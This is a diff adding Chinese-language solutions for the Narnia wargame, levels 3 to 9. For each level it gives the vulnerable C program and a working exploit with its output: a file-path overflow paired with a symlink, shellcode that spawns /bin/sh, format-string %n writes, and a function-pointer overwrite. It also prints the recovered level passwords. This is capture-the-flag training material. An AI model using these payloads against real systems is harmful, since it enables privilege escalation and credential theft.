@@ -178,7 +178,257 @@ int main(int argc, char **argv){
 }
 ``` 
 
-ifile 和 ofile 挨在一起， 然后strcpy 又没有对长度进行一个检查，
+ifile 和 ofile 挨在一起， 然后strcpy 又没有对长度进行一个检查，ofile比ifile先声明，所以ifile溢出以后存储的位置是在ofile中，将ofile原来的’/dev/null’覆盖了，从而能获取到下一个级别的密码
+
+
+```
+narnia3@narnia:/tmp/channy/aaaaaaaaaaaaaaaaaaaa/tmp/channy$ touch narnia4
+narnia3@narnia:/tmp/channy/aaaaaaaaaaaaaaaaaaaa/tmp/channy$ ln -s /etc/narnia_pass/narnia4 /tmp/channy/aaaaaaaaaaaaaaaaaaaa/tmp/channy/narnia4
+narnia3@narnia:/tmp/channy$ touch narnia4
+narnia3@narnia:/tmp/channy$ chmod 777 narnia4 
+narnia3@narnia:/tmp/channy$ ls -al
+total 148
+drwxr-sr-x    3 narnia3 root   4096 Feb 29 01:38 .
+drwxrws-wt 2230 root    root 139264 Feb 29 01:38 ..
+drwxr-sr-x    3 narnia3 root   4096 Feb 29 01:35 aaaaaaaaaaaaaaaaaaaa
+-rwxrwxrwx    1 narnia3 root      0 Feb 29 01:38 narnia4
+narnia3@narnia:/narnia$ ./narnia3 /tmp/channy/aaaaaaaaaaaaaaaaaaaa/tmp/channy/narnia4
+copied contents of /tmp/channy/aaaaaaaaaaaaaaaaaaaa/tmp/channy/narn to a safer place... (/tmp/channy/narn)
+narnia3@narnia:/tmp/channy$ cat narnia4 
+thaenohtai
+```
+
+## 5.
+
+```
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <ctype.h>
+
+extern char **environ;
+
+int main(int argc,char **argv){
+    int i;
+    char buffer[256];
+
+    for(i = 0; environ[i] != NULL; i++)
+        memset(environ[i], '\0', strlen(environ[i]));
+
+    if(argc>1)
+        strcpy(buffer,argv[1]);
+
+    return 0;
+}
+```
+
+每16字节对齐的问题，只在256后面加跳转地址是不行的，需要再加8字节的对齐
+
+```
+narnia4@narnia:/narnia$ ./narnia4 $(python -c 'print "\x90"*226+"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x8d\x4e\x08\x89\x46\x0c\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"+"\x10\xd8\xff\xff"')
+$ whoami
+narnia5
+$ cat /etc/narnia_pass/narnia5
+faimahchiy
+```
+## 6. gdb disassemble/disass
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char **argv){
+	int i = 1;
+	char buffer[64];
+
+	snprintf(buffer, sizeof buffer, argv[1]);
+	buffer[sizeof (buffer) - 1] = 0;
+	printf("Change i's value from 1 -> 500. ");
+
+	if(i==500){
+		printf("GOOD\n");
+        setreuid(geteuid(),geteuid());
+		system("/bin/sh");
+	}
+
+	printf("No way...let me give you a hint!\n");
+	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
+	printf ("i = %d (%p)\n", i, &i);
+	return 0;
+}
+```
+
+[reference](https://www.lukeaddison.co.uk/blog/narnia-level-5/)
+
+```
+narnia5@melinda:/narnia$ ./narnia5 "$(python -c 'import sys; sys.stdout.write("\xdc\xd6\xff\xff%496x%05$n")')"
+Change i's value from 1 -> 500. GOOD
+$ whoami
+narnia6
+$ cat /etc/narnia_pass/narnia6
+neezocaeng
+```
+
+## 7. 
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+extern char **environ;
+
+// tired of fixing values...
+// - morla
+unsigned long get_sp(void) {
+       __asm__("movl %esp,%eax\n\t"
+               "and $0xff000000, %eax"
+               );
+}
+
+int main(int argc, char *argv[]){
+    char b1[8], b2[8];
+    int  (*fp)(char *)=(int(*)(char *))&puts, i;
+
+    if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }
+
+    /* clear environ */
+    for(i=0; environ[i] != NULL; i++)
+        memset(environ[i], '\0', strlen(environ[i]));
+    /* clear argz    */
+    for(i=3; argv[i] != NULL; i++)
+        memset(argv[i], '\0', strlen(argv[i]));
+
+    strcpy(b1,argv[1]);
+    strcpy(b2,argv[2]);
+    //if(((unsigned long)fp & 0xff000000) == 0xff000000)
+    if(((unsigned long)fp & 0xff000000) == get_sp())
+        exit(-1);
+    fp(b1);
+
+    exit(1);
+}
+```
+
+[reference](https://www.lukeaddison.co.uk/blog/narnia-level-6/)
+
+```
+narnia6@melinda:/narnia$ ./narnia6 $(python -c 'print "sh;#" + "A"*4 + "\x70\x0e\xe6\xf7"' ) B
+$ whoami
+narnia7
+$ cat /etc/narnia_pass/narnia7
+ahkiaziphu
+$
+```
+
+## 8. 
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int goodfunction();
+int hackedfunction();
+
+int vuln(const char *format){
+        char buffer[128];
+        int (*ptrf)();
+
+        memset(buffer, 0, sizeof(buffer));
+        printf("goodfunction() = %p\n", goodfunction);
+        printf("hackedfunction() = %p\n\n", hackedfunction);
+
+        ptrf = goodfunction;
+        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);
+
+        printf("I guess you want to come to the hackedfunction...\n");
+        sleep(2);
+        ptrf = goodfunction;
+
+        snprintf(buffer, sizeof buffer, format);
+
+        return ptrf();
+}
+
+int main(int argc, char **argv){
+        if (argc <= 1){
+                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
+                exit(-1);
+        }
+        exit(vuln(argv[1]));
+}
+
+int goodfunction(){
+        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
+        fflush(stdout);
+
+        return 0;
+}
+
+int hackedfunction(){
+        printf("Way to go!!!!");
+	    fflush(stdout);
+        setreuid(geteuid(),geteuid());
+        system("/bin/sh");
+
+        return 0;
+}
+```
+
+[reference](https://security-times.net/narnia-level-7-level-8)
+
+```
+$ ./narnia7 $(python -c 'print "l\xd6\xff\xffm\xd6\xff\xffn\xd6\xff\xffo\xd6\xff\xff%145c%6$hhn%229c%7$hhn%126c%8$hhn%4c%9$hhn"')
+goodfunction() = 0x804867b
+hackedfunction() = 0x80486a1
+
+before : ptrf() = 0x804867b (0xffffd66c)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ id
+uid=14007(narnia7) gid=14007(narnia7) euid=14008(narnia8) groups=14008(narnia8),14007(narnia7)
+$ cat /etc/narnia_pass/narnia8
+mohthuphog
+```
+
+## 9.
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+// gcc's variable reordering fucked things up
+// to keep the level in its old style i am 
+// making "i" global unti i find a fix 
+// -morla 
+int i; 
+ 
+void func(char *b){
+	char *blah=b;
+	char bok[20];
+	//int i=0;
+ 
+	memset(bok, '\0', sizeof(bok));
+	for(i=0; blah[i] != '\0'; i++)
+		bok[i]=blah[i];
+ 
+	printf("%s\n",bok);
+}
+ 
+int main(int argc, char **argv){
+ 
+	if(argc > 1)       
+		func(argv[1]);
+	else    
+	printf("%s argument\n", argv[0]);
+ 
+	return 0;
+}
+```
+
 
 
 
